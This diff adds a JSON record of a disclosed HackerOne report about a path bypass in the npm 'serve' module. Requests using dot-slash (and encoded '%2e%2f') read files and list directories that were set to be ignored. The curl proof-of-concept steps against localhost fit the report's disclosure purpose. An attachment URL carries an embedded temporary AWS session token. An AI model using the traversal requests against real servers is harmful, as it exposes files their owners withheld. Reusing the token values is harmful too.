@@ -1,0 +1,138 @@
+{
+  "id": 330724,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzA3MjQ=",
+  "url": "https://hackerone.com/reports/330724",
+  "title": "[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-03-28T10:35:21.237Z",
+  "submitted_at": "2018-03-28T10:35:21.237Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tungpun",
+    "url": "/tungpun",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-5415"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-05-30T13:04:31.883Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-05-30T13:04:20.295Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a vulnerability in **serve**.\nIt allows listing directory and reading local files on the target server.\n\n# Module\n\n**module name:** serve\n**version:** 6.5.3\n**npm page:** `https://www.npmjs.com/package/serve`\n\n## Module Description\n\nEver wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.\n\nIn addition, it's also awesome when it comes to serving static sites!\n\n# Vulnerability\n\n## Steps To Reproduce:\n\n* Install serve:\n\n`$ npm i serve`\n\n* Create some child directories, files for demonstration:\n\n`$ mkdir dir`\n\n`$ echo \"This is secret content!!\" > dir/secret.txt`\n\n`$ mkdir dir/dir2`\n\n`$ touch dir/dir2/3.txt`\n\n* Create an application that uses `serve` for file serving listing and set a few folders and files in the ignore config.\n\n```\nconst serve = require('serve')\nconst server = serve(__dirname, {\n      port: 6060,\n      ignore: ['dir/secret.txt', 'dir/dir2']\n})\n```\n\n* Run the app\n\n`$ node app.js`\n\nNow, the current directory will be served by this module on port `6060` with the exception of file `dir/secret.txt` and directory `'dir/dir2`.\n\n* If we try to request these ignored files/directories, we get a Not Found error\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'\nNot Found\n```\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'\nNot Found\n```\n\nor if we replace `e` character with URI encoded form `%65`, it still be ignored:\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'\nNot Found\n```\n\n* However, I found a way to access that file by using dot-slash.\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'\nThis is secret content!!\n```\n\nOr listing the directory:\n\n`http://127.0.0.1:6060/dir/%2e%2fdir2/`\n\n{F279456}\n\n## Supporting Material/References:\n\n* macOS High Sierra 10.13.3\n* node v8.10.0\n* npm 5.8.0\n* Chrome Version 65.0.3325.162 (Official Build) (64-bit)\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n## Impact\n\nIt bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.",
+  "weakness": {
+    "id": 89,
+    "name": "Information Exposure Through Directory Listing"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 279456,
+      "file_name": "serve2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/456/a4e4c2e45fecafc065d60faaa25c8d2010083dcf/serve2.png?response-content-disposition=attachment%3B%20filename%3D%22serve2.png%22%3B%20filename%2A%3DUTF-8%27%27serve2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAEI4RK%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152411Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQCSD%2FPjPDVe1eeNkPPAD%2Bk0DdPa3c110Hf5n5NLkL28uAIhAOvetlU3QlhnR7TdyJ9RS5Jr8LBzpFA%2FuRFoLa3tPP1hKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzZUaY6gDTyaLxuf3MqjwWEoQ7vpUAzBTpX4KMmwMKarHDJZGfuEh8vIN86CHR4RAyMCB8CvNQwPdX95bpZFxfVn4Hin6ko4E4zMNrBlofPZ4J8vHkxkUnzFqMkNQLVMOMomFdWGoBswDyqoLkU3KNWbjh37k2C2nMzaJQh9pBqfidoKzH3hoapalZg8O3vWQ8rc1w7jaIaagTNR5stpgdsXT6xcefocikcPPnxS8uf2Or7jdqWRdPtbO4ioSoQ5ezUBCTb4t8DiEJhFmM%2BHH%2F0OUNxymiCWvR67lK3TNE7WE%2FeHP9G%2FIL5Qu2z8jK1hUvWU9f8YtjdtCaQuNm4tU7aQOrwD6TCOvYBGlMgznBreHVV5nqbetejZJEuX2OJ09X3MTU6nf04wDzD2qO6RYeWAZnmjidFdHtc3JwvbrjXdMoF5K1dTQpbOFW3ghWFd%2B8hscmVXBsbEHelxj1uHUaHAw2rCB4f9lC0trvqnM9JCAyJPstgf4RjY1T6Rc%2BFvSsrrJln3o80qoZLgTusUV%2F%2BWx8w4zlFu5Y%2Bn8SekqRUm1OqEffi525YSjmfQaLybOKm01K0R%2FpKI513q9eqq8tH1cwWH29UCWjbPxI%2F7hJA55Nz6DeAxplorcFc%2FzIiVhczo%2Bibkg880uPKNmhvey3nsA3kxXHvwW6cwbecEcXPjDIBOSz9MbReIkTNH9AD9zDefJSEhL1BRNtVrIerKPZLur%2B9Yj90xinBNa3woyyuiFsEHvl7jijqsOy9%2FNj4gxecl%2FJghoHZ5HBmWrMmXC5Yek0CA7u3n4dO1mby8CdBzTFEYv1E9jzjgBE5fxk%2BLAENQJSw1RSpz5BW3d1eL4lG5UcGGCpElYt5%2F4o0ztwvMW21evbq%2Bh0TtJkznOEWMM6U%2Fc8GOrABK3l928F6wdaGUie7N8id3oDy9xPpGu2dY7RMZlB%2FEu67joF2b536zeIT3pXYb%2FNRxOOOdLoaNTvOSrHOQMJ2fkvT%2FnkSN8fv6F1taX3uyI9pZ4KnzjAjNKC8Rs8Afd6M5fMLpJoD5jWuq4pdBfen8zrTNwbZDsCUwKm4NZ70bspKkbWIVXvr5O8x%2FejsP1iungs5wZ7sLR20NcHf9VWx1hAISD3O2%2BvGi2R7Lvz5i%2B4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6e7e30765df934493921812f80650e6828cb626192435778bb77e96c088508d0",
+      "file_size": 281843,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-06-29T13:04:20.418Z",
+  "allow_singular_disclosure_after": -248062791.43452647,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "bl4de",
+    "eveeez"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5006,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "serve",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
